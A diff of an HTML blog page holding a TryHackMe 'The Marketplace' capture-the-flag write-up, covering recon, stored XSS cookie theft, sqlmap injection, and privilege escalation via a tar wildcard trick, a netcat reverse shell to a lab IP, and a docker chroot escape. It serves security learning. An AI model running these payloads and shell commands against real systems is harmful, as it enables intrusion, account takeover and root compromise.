@@ -8,8 +8,7 @@
 <title>THM: The Marketplace</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"><link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap"rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap"rel="stylesheet"><script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script><link rel="stylesheet" href="/src/rougier.css" />
-    <link rel="icon" type="image/x-icon" href="/src/favicon.ico"><meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
 <div id="org-div-home-and-up">
@@ -22,39 +21,39 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org2f3995c">Reconnaisance</a>
+<li><a href="#org67036d3">Reconnaisance</a>
 <ul>
-<li><a href="#orgcda5e1b">Web Analysis</a>
+<li><a href="#org4820630">Web Analysis</a>
 <ul>
-<li><a href="#orgb829818">Creating a <code>test</code> user</a></li>
+<li><a href="#orgc5c082f">Creating a <code>test</code> user</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org4f00658">XSS Exploitation</a></li>
-<li><a href="#orge48aa9e">SQL Injection</a></li>
-<li><a href="#org7da4aa6">Privilege escalation</a></li>
-<li><a href="#orga990245">Conclusion</a></li>
+<li><a href="#org1888475">XSS Exploitation</a></li>
+<li><a href="#orgc4e7715">SQL Injection</a></li>
+<li><a href="#orgc7f3515">Privilege escalation</a></li>
+<li><a href="#org0d3e8e9">Conclusion</a></li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org2f3995c" class="outline-2">
-<h2 id="org2f3995c"><a href="#org2f3995c">Reconnaisance</a></h2>
-<div class="outline-text-2" id="text-org2f3995c">
+<div id="outline-container-org67036d3" class="outline-2">
+<h2 id="org67036d3"><a href="#org67036d3">Reconnaisance</a></h2>
+<div class="outline-text-2" id="text-org67036d3">
 <p>
 Running a quick <code>nmap</code> scan to get some initial information on the
 target system:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org0e18ed2">nmap -sV -sC -oN nmap.initial 10.10.146.88
+<pre class="src src-bash" id="org4ad68c7">nmap -sV -sC -oN nmap.initial 10.10.146.88
 </pre>
 </div>
 
 <p>
 It gives us lot&rsquo;s of information:
 </p>
-<pre class="example" id="org721d128">
+<pre class="example" id="org1a52c2d">
 Nmap scan report for ip-10-10-146-88.eu-west-1.compute.internal (10.10.146.88)
 Host is up (0.00021s latency).
 Not shown: 997 filtered ports
@@ -85,14 +84,14 @@ one.
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org374e552">nmap -p- -T4 10.10.146.88 | tee nmap.full
+<pre class="src src-bash" id="org55f5cd9">nmap -p- -T4 10.10.146.88 | tee nmap.full
 </pre>
 </div>
 
 <p>
 It&rsquo;s output was the same:
 </p>
-<pre class="example" id="orgb0e4067">
+<pre class="example" id="orgf10b41d">
 Nmap scan report for ip-10-10-146-88.eu-west-1.compute.internal (10.10.146.88)
 Host is up (0.00040s latency).
 Not shown: 65532 filtered ports
@@ -104,15 +103,15 @@ MAC Address: 02:3C:29:73:B9:79 (Unknown)
 </pre>
 </div>
 
-<div id="outline-container-orgcda5e1b" class="outline-3">
-<h3 id="orgcda5e1b"><a href="#orgcda5e1b">Web Analysis</a></h3>
-<div class="outline-text-3" id="text-orgcda5e1b">
+<div id="outline-container-org4820630" class="outline-3">
+<h3 id="org4820630"><a href="#org4820630">Web Analysis</a></h3>
+<div class="outline-text-3" id="text-org4820630">
 <p>
 I checked for <code>robots.txt, security.txt, sitemap.xml</code> files, out of
 which only the first existed, without much information available to us:
 </p>
 
-<div id="org5d4a02f" class="figure">
+<div id="orgfe21004" class="figure">
 <p><img src="Reconnaisance/20231022_185121_screenshot.png" alt="20231022_185121_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 1: </span>Robots.txt contents</p>
@@ -122,14 +121,14 @@ which only the first existed, without much information available to us:
 Then, I ran <code>gobuster</code> while manually checking the website out:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org30145c2">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.146.88 | tee gobuster.bigtxt
+<pre class="src src-bash" id="org8a7eeb1">gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u http://10.10.146.88 | tee gobuster.bigtxt
 </pre>
 </div>
 
 <p>
 Its output was not much
 </p>
-<pre class="example" id="org52414df">
+<pre class="example" id="org68da9c8">
 ==============================================================
 Gobuster v3.0.1
 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
@@ -162,9 +161,9 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
 </pre>
 </div>
 
-<div id="outline-container-orgb829818" class="outline-4">
-<h4 id="orgb829818"><a href="#orgb829818">Creating a <code>test</code> user</a></h4>
-<div class="outline-text-4" id="text-orgb829818">
+<div id="outline-container-orgc5c082f" class="outline-4">
+<h4 id="orgc5c082f"><a href="#orgc5c082f">Creating a <code>test</code> user</a></h4>
+<div class="outline-text-4" id="text-orgc5c082f">
 <p>
 Since the site was way too simple (I think about 4 almost blank
 pages), I created a <code>test</code> user to see what extra functionality logging
@@ -172,7 +171,7 @@ in offered:
 </p>
 
 
-<div id="orgad3f814" class="figure">
+<div id="org973666c" class="figure">
 <p><img src="Reconnaisance/20231022_190304_screenshot.png" alt="20231022_190304_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 2: </span>Allowing for new listings and messages(!)</p>
@@ -188,7 +187,7 @@ security issues</b>. That&rsquo;s not really a problem
 </p>
 
 
-<div id="org861b51d" class="figure">
+<div id="org5ed927f" class="figure">
 <p><img src="Reconnaisance/20231022_190913_screenshot.png" alt="20231022_190913_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 3: </span>New listings page</p>
@@ -201,7 +200,7 @@ concept. It worked fine.
 </p>
 
 
-<div id="orgb70de24" class="figure">
+<div id="org90fdaef" class="figure">
 <p><img src="Reconnaisance/20231022_191002_screenshot.png" alt="20231022_191002_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 4: </span>Creating a new listing</p>
@@ -211,7 +210,7 @@ concept. It worked fine.
 
 
 
-<div id="org7ea70f0" class="figure">
+<div id="org51de9de" class="figure">
 <p><img src="Reconnaisance/20231022_191112_screenshot.png" alt="20231022_191112_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 5: </span>Working XSS <code>alert(1)</code> payload</p>
@@ -225,7 +224,7 @@ being, checking the website&rsquo;s cookies seems equally promising
 </p>
 
 
-<div id="org36cfd15" class="figure">
+<div id="orgf8cad15" class="figure">
 <p><img src="Reconnaisance/20231022_191849_screenshot.png" alt="20231022_191849_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 6: </span>Way to contact PPL (pun intended)</p>
@@ -234,14 +233,14 @@ being, checking the website&rsquo;s cookies seems equally promising
 <p>
 The cookie is of the typical form:
 </p>
-<pre class="example" id="orgb2ae03e">
+<pre class="example" id="org09d1c38">
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJ1c2VySWQiOjYsInVzZXJuYW1lIjoidGVzdCIsImFkbWluIjpmYWxzZSwiaWF0IjoxNjk3OTkwMTQ4fQNxRVUKaYnmQAxWMchI-rMWA2C0FFOx-XXXdtV20Xe04
 </pre>
 <p>
 which, after decoding (it obviously is base64 encoded) reveals its
 three parts:
 </p>
-<pre class="example" id="org7359698">
+<pre class="example" id="org39f3c2c">
 {"alg":"HS256","typ":"JWT"}
 {"userId":6,"username":"test","admin":false,"iat":1697990148}
 qEU i@V1H`Suvvw
@@ -250,7 +249,7 @@ three parts:
 <p>
 At this point I could try crafting a cookie like this:
 </p>
-<pre class="example" id="orgfe74663">
+<pre class="example" id="org4352875">
 {"alg":"none","typ":"JWT"}
 {"userId":0,"username":"admin","admin":true,"iat":1697990148}
 
@@ -266,15 +265,15 @@ for a fact that <code>admin</code> user does not exists (I tried creating a user
 </div>
 </div>
 
-<div id="outline-container-org4f00658" class="outline-2">
-<h2 id="org4f00658"><a href="#org4f00658">XSS Exploitation</a></h2>
-<div class="outline-text-2" id="text-org4f00658">
+<div id="outline-container-org1888475" class="outline-2">
+<h2 id="org1888475"><a href="#org1888475">XSS Exploitation</a></h2>
+<div class="outline-text-2" id="text-org1888475">
 <p>
 I first created a listing that would get me the cookie of anyone
 viewing it:
 </p>
 
-<div id="orgd5a6c16" class="figure">
+<div id="org6c5bd98" class="figure">
 <p><img src="XSS_Exploitation/20231022_193437_screenshot.png" alt="20231022_193437_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 7: </span>Malicious listing</p>
@@ -290,7 +289,7 @@ did not disappoint.
 When I got back from my water break, a cookie was waiting for me!!
 </p>
 
-<div id="org0fe136b" class="figure">
+<div id="org762f733" class="figure">
 <p><img src="XSS_Exploitation/20231022_193832_screenshot.png" alt="20231022_193832_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 8: </span>Admin&rsquo;s cookieeeeeee!</p>
@@ -302,7 +301,7 @@ for me there !
 </p>
 
 
-<div id="org4c7d129" class="figure">
+<div id="org3842cb1" class="figure">
 <p><img src="XSS_Exploitation/20231022_194020_screenshot.png" alt="20231022_194020_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 9: </span>We&rsquo;re getting somewhere.</p>
@@ -348,9 +347,9 @@ for a writeup online, I had overlooked an SQL Injection entry point)
 </div>
 </div>
 
-<div id="outline-container-orge48aa9e" class="outline-2">
-<h2 id="orge48aa9e"><a href="#orge48aa9e">SQL Injection</a></h2>
-<div class="outline-text-2" id="text-orge48aa9e">
+<div id="outline-container-orgc4e7715" class="outline-2">
+<h2 id="orgc4e7715"><a href="#orgc4e7715">SQL Injection</a></h2>
+<div class="outline-text-2" id="text-orgc4e7715">
 <p>
 More specifically, when selecting a user in the administration panel,
 the website would point us to <code>/admin?user=1</code>, which after testing with
@@ -358,7 +357,7 @@ the old classic <code>' OR 1=1;--</code>, shows an error:
 </p>
 
 
-<div id="orge366bec" class="figure">
+<div id="orgfc9d0b8" class="figure">
 <p><img src="SQL_Injection/20231022_200202_screenshot.png" alt="20231022_200202_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 10: </span>SQL Error</p>
@@ -368,7 +367,7 @@ the old classic <code>' OR 1=1;--</code>, shows an error:
 Seeing that an SQLi could be beneficial, I used <code>sqlmap</code>:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org3a3eea9">sqlmap -u http://10.10.146.88/admin?<span class="org-variable-name">user</span>=1 --batch
+<pre class="src src-bash" id="org16b30d1">sqlmap -u http://10.10.146.88/admin?<span class="org-variable-name">user</span>=1 --batch
 </pre>
 </div>
 
@@ -387,7 +386,7 @@ eventually fixed the problem:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="org2af9a48">sqlmap --url=<span class="org-string">'http://10.10.146.88/admin?user=1'</span> --cookie=<span class="org-string">'token=DATOKEN'</span> --technique=U --delay=2 --dump
+<pre class="src src-bash" id="orgc0dda9e">sqlmap --url=<span class="org-string">'http://10.10.146.88/admin?user=1'</span> --cookie=<span class="org-string">'token=DATOKEN'</span> --technique=U --delay=2 --dump
 </pre>
 </div>
 
@@ -408,7 +407,7 @@ most important is hidden in a message there: we get the password for <code>jake<
 And after logging in we get the second flag:
 </p>
 
-<div id="org9bc631c" class="figure">
+<div id="org96d5db8" class="figure">
 <p><img src="SQL_Injection/20231022_205347_screenshot.png" alt="20231022_205347_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 11: </span>The second flag</p>
@@ -416,9 +415,9 @@ And after logging in we get the second flag:
 </div>
 </div>
 
-<div id="outline-container-org7da4aa6" class="outline-2">
-<h2 id="org7da4aa6"><a href="#org7da4aa6">Privilege escalation</a></h2>
-<div class="outline-text-2" id="text-org7da4aa6">
+<div id="outline-container-orgc7f3515" class="outline-2">
+<h2 id="orgc7f3515"><a href="#orgc7f3515">Privilege escalation</a></h2>
+<div class="outline-text-2" id="text-orgc7f3515">
 <p>
 Knowing that the last flag is a file called <code>root.txt</code> I used <code>find</code>
 hoping its output to show me its location. No luck though.
@@ -441,7 +440,7 @@ I created a directory and worked in it (<code>wrk</code>), but it is not necessa
 In fact, this will work anywhere!
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orgd567d84"><span class="org-builtin">echo</span> <span class="org-string">"rm -f /tmp/lhennp;mkfifo /tmp/lhennp; nc 10.10.199.235 6969 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp"</span> &gt; shell.sh
+<pre class="src src-bash" id="org18c0ed8"><span class="org-builtin">echo</span> <span class="org-string">"rm -f /tmp/lhennp;mkfifo /tmp/lhennp; nc 10.10.199.235 6969 0&lt;/tmp/lhennp | /bin/sh &gt;/tmp/lhennp 2&gt;&amp;1; rm /tmp/lhennp"</span> &gt; shell.sh
 <span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; <span class="org-string">"--checkpoint-action=exec=sh shell.sh"</span>
 <span class="org-builtin">echo</span> <span class="org-string">""</span> &gt; --checkpoint=1
 </pre>
@@ -452,7 +451,7 @@ Please do not make the mistake of running the command as is :P. Run it
 as michael with:j
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org696fafd">sudo -u michael /opt/backups/backup.sh 
+<pre class="src src-bash" id="orgd20fc9c">sudo -u michael /opt/backups/backup.sh 
 </pre>
 </div>
 
@@ -461,7 +460,7 @@ Finally we get the rev shell, and make it work a little bit better
 with some python:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orga1c2efb">python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
+<pre class="src src-bash" id="org7feabd4">python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
 </pre>
 </div>
 
@@ -478,12 +477,12 @@ get root privileges, which actually worked using the second command,
 found in <a href="https://gtfobins.github.io/gtfobins/docker/">https://gtfobins.github.io/gtfobins/docker/</a>
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="orge52cc62">docker ps
+<pre class="src src-bash" id="org1610195">docker ps
 </pre>
 </div>
 
 <div class="org-src-container">
-<pre class="src src-bash" id="orgdd60077">docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+<pre class="src src-bash" id="orgb4f669e">docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 </pre>
 </div>
 
@@ -492,7 +491,7 @@ After becoming root there was nothing else to do. It was finally over.
 </p>
 
 
-<div id="org3e45a6d" class="figure">
+<div id="org51e2d4d" class="figure">
 <p><img src="Privilege_escalation/20231022_212928_screenshot.png" alt="20231022_212928_screenshot.png" />
 </p>
 <p><span class="figure-number">Figure 12: </span>THE END</p>
@@ -501,9 +500,9 @@ After becoming root there was nothing else to do. It was finally over.
 </div>
 
 
-<div id="outline-container-orga990245" class="outline-2">
-<h2 id="orga990245"><a href="#orga990245">Conclusion</a></h2>
-<div class="outline-text-2" id="text-orga990245">
+<div id="outline-container-org0d3e8e9" class="outline-2">
+<h2 id="org0d3e8e9"><a href="#org0d3e8e9">Conclusion</a></h2>
+<div class="outline-text-2" id="text-org0d3e8e9">
 <p>
 I liked the room, a lot and it was on a good level for me to try and
 complete, being neither too easy nor too hard. Not noticing the SQL
@@ -517,7 +516,7 @@ using the <code>id</code> command, but this is part of learning so&#x2026; C&rsq
 </div>
 </div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id="R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="date footer"> Originally created on 2023-10-22 Sun 18:31 </p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br>If you liked my work (and want more :P), consider <a href="https://www.buymeacoffee.com/chatziiolef">buying me a coffee</a></p>
 </div>
 </body>
 </html>
